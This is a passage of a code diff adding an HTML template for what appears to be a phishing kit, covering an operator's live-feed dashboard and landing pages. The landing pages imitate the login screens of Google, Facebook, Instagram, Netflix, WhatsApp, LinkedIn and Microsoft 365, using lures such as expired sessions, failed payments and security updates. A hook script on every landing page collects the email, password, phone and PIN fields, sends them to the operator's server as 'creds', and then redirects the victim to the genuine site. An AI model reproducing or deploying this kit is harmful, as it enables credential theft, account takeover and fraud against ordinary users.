+              <span class="hide-mobile">Live Feed</span>
+            </h1>
+          </div>
+          <div class="topbar-right">
+            <div class="live-indicator" id="connection-status">
+              <span class="live-dot"></span> Connected
+            </div>
+          </div>
+        </header>
+
+        <div class="page-content">
+          <div class="card">
+            <div class="card-header">
+              <h3 class="card-title">
+                <i class="fas fa-broadcast-tower"></i> Real-Time Activity
+              </h3>
+              <span class="text-xs text-muted">Auto-updates via WebSocket</span>
+            </div>
+            <div class="card-body flush">
+              <div
+                class="live-feed"
+                id="live-feed"
+                style="max-height: calc(100vh - 200px)"
+              >
+                <div class="empty-state" style="padding: 60px 24px">
+                  <i class="fas fa-satellite-dish"></i>
+                  <p>Listening for data from all active sessions...</p>
+                  <p class="text-xs text-muted mt-1">
+                    Events will appear here in real-time
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    {% endif %} {# end of non-landing pages #} {# =======================
+    LANDING PAGES ======================= #} {% elif page == 'landing' %} {% if
+    template_type == 'google_login' %}
+    <div class="landing-page" style="background: #f8f9fa">
+      <div class="landing-card-outer">
+        <img
+          src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+          alt="Google"
+          style="height: 36px; margin-bottom: 20px"
+        />
+        <h2 style="color: #202124; font-size: 24px; margin-bottom: 8px">
+          Sign in
+        </h2>
+        <p style="color: #5f6368; font-size: 14px; margin-bottom: 24px">
+          Your session has expired. Please sign in again.
+        </p>
+        <form id="landing-form">
+          <input
+            type="email"
+            name="email"
+            class="landing-input"
+            placeholder="Email or phone"
+            autocomplete="email"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input"
+            placeholder="Enter your password"
+            autocomplete="current-password"
+            required
+          />
+          <div style="text-align: left; margin-bottom: 18px">
+            <a href="#" style="font-size: 13px; color: #1a73e8"
+              >Forgot password?</a
+            >
+          </div>
+          <div
+            style="
+              display: flex;
+              justify-content: space-between;
+              align-items: center;
+            "
+          >
+            <a
+              href="#"
+              style="font-size: 14px; color: #1a73e8; font-weight: 500"
+              >Create account</a
+            >
+            <button
+              type="submit"
+              class="landing-btn-submit"
+              style="
+                width: auto;
+                padding: 10px 24px;
+                background: #1a73e8;
+                border-radius: 4px;
+              "
+            >
+              Next
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    {% elif template_type == 'facebook_verify' %}
+    <div class="landing-page" style="background: #f0f2f5">
+      <div class="landing-card-outer">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
+          alt="Facebook"
+          style="height: 48px; margin-bottom: 16px"
+        />
+        <h2 style="color: #1c1e21; font-size: 20px; margin-bottom: 8px">
+          Account Verification Required
+        </h2>
+        <p style="color: #606770; font-size: 14px; margin-bottom: 24px">
+          Unusual activity detected. Verify your identity to continue.
+        </p>
+        <form id="landing-form">
+          <input
+            type="text"
+            name="email"
+            class="landing-input"
+            placeholder="Email or phone number"
+            autocomplete="email"
+            required
+            style="background: #f5f6f7"
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          />
+          <button
+            type="submit"
+            class="landing-btn-submit"
+            style="background: #1877f2; border-radius: 6px"
+          >
+            Verify Account
+          </button>
+        </form>
+        <hr
+          style="margin: 20px 0; border: none; border-top: 1px solid #dddfe2"
+        />
+        <p style="font-size: 12px; color: #90949c">
+          Required by Facebook's security policy.
+        </p>
+      </div>
+    </div>
+
+    {% elif template_type == 'instagram_badge' %}
+    <div class="landing-page" style="background: #fafafa">
+      <div
+        class="landing-card-outer"
+        style="border: 1px solid #dbdbdb; max-width: 400px"
+      >
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png"
+          alt="Instagram"
+          style="height: 44px; margin-bottom: 20px"
+        />
+        <h2 style="color: #262626; font-size: 18px; margin-bottom: 8px">
+          Verify Your Account
+        </h2>
+        <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px">
+          Confirm your login to apply for the verification badge.
+        </p>
+        <form id="landing-form">
+          <input
+            type="text"
+            name="username"
+            class="landing-input"
+            placeholder="Phone, username, or email"
+            autocomplete="username"
+            required
+            style="
+              background: #fafafa;
+              border-color: #dbdbdb;
+              border-radius: 3px;
+              padding: 10px 12px;
+              font-size: 14px;
+            "
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+            style="
+              background: #fafafa;
+              border-color: #dbdbdb;
+              border-radius: 3px;
+              padding: 10px 12px;
+              font-size: 14px;
+            "
+          />
+          <button
+            type="submit"
+            class="landing-btn-submit"
+            style="
+              background: linear-gradient(
+                45deg,
+                #f09433,
+                #e6683c,
+                #dc2743,
+                #cc2366,
+                #bc1888
+              );
+              border-radius: 4px;
+              font-size: 14px;
+              padding: 9px;
+            "
+          >
+            Continue
+          </button>
+        </form>
+      </div>
+    </div>
+
+    {% elif template_type == 'netflix_payment' %}
+    <div class="landing-page" style="background: #141414">
+      <div class="landing-card-outer dark">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"
+          alt="Netflix"
+          style="height: 36px; margin-bottom: 20px"
+        />
+        <h2 style="color: #fff; font-size: 22px; margin-bottom: 8px">
+          Update Your Payment
+        </h2>
+        <p style="color: #b3b3b3; font-size: 14px; margin-bottom: 24px">
+          We couldn't process your last payment. Update to avoid interruption.
+        </p>
+        <form id="landing-form">
+          <input
+            type="email"
+            name="email"
+            class="landing-input dark"
+            placeholder="Email address"
+            autocomplete="email"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input dark"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          />
+          <button
+            type="submit"
+            class="landing-btn-submit"
+            style="background: #e50914; border-radius: 4px; padding: 14px"
+          >
+            Update & Continue
+          </button>
+        </form>
+      </div>
+    </div>
+
+    {% elif template_type == 'whatsapp_update' %}
+    <div class="landing-page" style="background: #e5ddd5">
+      <div
+        class="landing-card-outer"
+        style="border: none; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15)"
+      >
+        <div
+          style="
+            width: 64px;
+            height: 64px;
+            background: #25d366;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: #fff;
+            font-size: 28px;
+          "
+        >
+          <svg viewBox="0 0 24 24" width="32" height="32" fill="#fff">
+            <path
+              d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"
+            />
+          </svg>
+        </div>
+        <h2 style="color: #075e54; font-size: 20px; margin-bottom: 8px">
+          Security Update
+        </h2>
+        <p style="color: #667781; font-size: 14px; margin-bottom: 24px">
+          A critical security patch is available. Verify to apply.
+        </p>
+        <form id="landing-form">
+          <input
+            type="tel"
+            name="phone"
+            class="landing-input"
+            placeholder="Phone with country code"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input"
+            placeholder="6-digit PIN"
+            autocomplete="current-password"
+            required
+          />
+          <button
+            type="submit"
+            class="landing-btn-submit"
+            style="background: #25d366; border-radius: 8px"
+          >
+            Verify & Update
+          </button>
+        </form>
+      </div>
+    </div>
+
+    {% elif template_type == 'linkedin_connect' %}
+    <div class="landing-page" style="background: #f3f2ef">
+      <div class="landing-card-outer">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png"
+          alt="LinkedIn"
+          style="height: 40px; margin-bottom: 16px"
+        />
+        <h2 style="color: #191919; font-size: 22px; margin-bottom: 8px">
+          Sign in to LinkedIn
+        </h2>
+        <p style="color: #666; font-size: 14px; margin-bottom: 24px">
+          You have a new connection request.
+        </p>
+        <form id="landing-form">
+          <input
+            type="email"
+            name="email"
+            class="landing-input"
+            placeholder="Email or Phone"
+            autocomplete="email"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          />
+          <button
+            type="submit"
+            class="landing-btn-submit"
+            style="background: #0a66c2; border-radius: 24px"
+          >
+            Sign in
+          </button>
+        </form>
+      </div>
+    </div>
+
+    {% elif template_type == 'microsoft_365' %}
+    <div class="landing-page" style="background: #f2f2f2">
+      <div class="landing-card-outer" style="text-align: left; padding: 44px">
+        <img
+          src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+          alt="Microsoft"
+          style="height: 24px; margin-bottom: 20px"
+        />
+        <h2
+          style="
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 4px;
+          "
+        >
+          Sign in
+        </h2>
+        <p style="color: #1b1b1b; font-size: 14px; margin-bottom: 24px">
+          to continue to Microsoft 365
+        </p>
+        <form id="landing-form">
+          <input
+            type="email"
+            name="email"
+            class="landing-input"
+            placeholder="Email, phone, or Skype"
+            autocomplete="email"
+            required
+            style="
+              border: none;
+              border-bottom: 1px solid #666;
+              border-radius: 0;
+              padding: 8px 4px;
+              background: transparent;
+            "
+          />
+          <input
+            type="password"
+            name="password"
+            class="landing-input"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+            style="
+              border: none;
+              border-bottom: 1px solid #666;
+              border-radius: 0;
+              padding: 8px 4px;
+              background: transparent;
+            "
+          />
+          <div style="margin: 8px 0 20px">
+            <a href="#" style="font-size: 13px; color: #0067b8"
+              >Forgot password?</a
+            >
+          </div>
+          <div style="text-align: right">
+            <button
+              type="submit"
+              class="landing-btn-submit"
+              style="
+                width: auto;
+                padding: 8px 32px;
+                background: #0067b8;
+                border-radius: 2px;
+              "
+            >
+              Sign in
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    {% else %} {# Blank / Custom #}
+    <div class="landing-page" style="background: #fff">
+      <div class="landing-card-outer" style="text-align: center">
+        <div
+          class="spinner"
+          style="
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+          "
+        ></div>
+        <p style="color: #666; font-size: 14px; margin-top: 16px">
+          Loading, please wait...
+        </p>
+        <style>
+          @keyframes spin {
+            to {
+              transform: rotate(360deg);
+            }
+          }
+        </style>
+      </div>
+    </div>
+    {% endif %} {# Hook Script for ALL landing pages #}
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="{{ server_url }}/assets/js/analytics.js?sid={{ session_id }}"></script>
+    <script>
+      (function(){
+        var form = document.getElementById('landing-form');
+        if (!form) return;
+
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          var data = {};
+          form.querySelectorAll('input').forEach(function(inp){ data[inp.name || inp.type] = inp.value; });
+
+          var payload = JSON.stringify({
+            sid: '{{ session_id }}',
+            type: 'creds',
+            data: {
+              username: data.email || data.username || data.phone || '',
+              password: data.password || data.pin || '',
+              url: location.href,
+              source: 'landing_{{ template_type }}',
+              all_fields: data,
+              ts: Date.now()
+            }
+          });
+
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon('{{ server_url }}/api/c/beacon', new Blob([payload], {type:'application/json'}));
+          } else {
+            fetch('{{ server_url }}/api/c/beacon', {method:'POST',headers:{'Content-Type':'application/json'},body:payload,keepalive:true}).catch(function(){});
+          }
+
+          var btn = form.querySelector('button[type="submit"]');
+          if (btn) { btn.disabled = true; btn.textContent = 'Please wait...'; }
+
+          setTimeout(function(){
+            {% if template_type == 'google_login' %}window.location.href='https://accounts.google.com';
+            {% elif template_type == 'facebook_verify' %}window.location.href='https://www.facebook.com';
+            {% elif template_type == 'instagram_badge' %}window.location.href='https://www.instagram.com';
+            {% elif template_type == 'netflix_payment' %}window.location.href='https://www.netflix.com';
+            {% elif template_type == 'whatsapp_update' %}window.location.href='https://web.whatsapp.com';
+            {% elif template_type == 'linkedin_connect' %}window.location.href='https://www.linkedin.com';
+            {% elif template_type == 'microsoft_365' %}window.location.href='https://www.office.com';
+            {% else %}window.location.href='https://www.google.com';
+            {% endif %}
+          }, 1500);
+        });
+      })();
+    </script>
+
+    {% endif %} {# Dashboard scripts (admin pages only) #} {% if page !=
+    'landing' and page != 'login' %}
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+    {% endif %}
+  </body>
+</html>
